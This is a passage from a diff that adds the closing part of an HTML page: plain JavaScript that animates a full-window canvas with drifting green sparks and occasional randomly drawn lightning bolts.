+    var ctx=cv.getContext('2d'), W,H,DPR=Math.min(2,window.devicePixelRatio||1), sparks=[];
+    function size(){ W=cv.width=innerWidth*DPR; H=cv.height=innerHeight*DPR; cv.style.width=innerWidth+'px'; cv.style.height=innerHeight+'px'; }
+    size(); addEventListener('resize', size);
+    for(var i=0;i<46;i++){ sparks.push({x:Math.random()*1,y:Math.random()*1,v:.0004+Math.random()*.0011,r:(Math.random()*1.4+.3)*DPR,a:Math.random()*.5+.15}); }
+    var bolt=null, boltT=0;
+    function makeBolt(){
+      var x=Math.random()*W, pts=[{x:x,y:0}], y=0, seg=H/ (10+Math.random()*8);
+      while(y<H){ y+=seg; pts.push({x:x+(Math.random()-.5)*90*DPR, y:y}); x=pts[pts.length-1].x; }
+      bolt=pts; boltT=1;
+    }
+    var next=Date.now()+1800+Math.random()*2600;
+    function draw(){
+      ctx.clearRect(0,0,W,H);
+      for(var i=0;i<sparks.length;i++){ var s=sparks[i]; s.y-=s.v; if(s.y<0){s.y=1;s.x=Math.random();}
+        ctx.beginPath(); ctx.arc(s.x*W, s.y*H, s.r, 0, 6.28);
+        ctx.fillStyle='rgba(59,255,143,'+(s.a*(.6+.4*Math.sin((Date.now()/700)+i)))+')'; ctx.fill();
+      }
+      if(Date.now()>next){ makeBolt(); next=Date.now()+2600+Math.random()*4200; }
+      if(bolt){
+        ctx.lineWidth=2*DPR; ctx.strokeStyle='rgba(120,255,190,'+boltT+')'; ctx.shadowColor='rgba(59,255,143,'+boltT+')'; ctx.shadowBlur=18*DPR;
+        ctx.beginPath(); ctx.moveTo(bolt[0].x,bolt[0].y); for(var j=1;j<bolt.length;j++) ctx.lineTo(bolt[j].x,bolt[j].y); ctx.stroke();
+        ctx.shadowBlur=0; boltT-=.045; if(boltT<=0) bolt=null;
+      }
+      requestAnimationFrame(draw);
+    }
+    draw();
+  }
+})();
+</script>
+
+</body>
+</html>
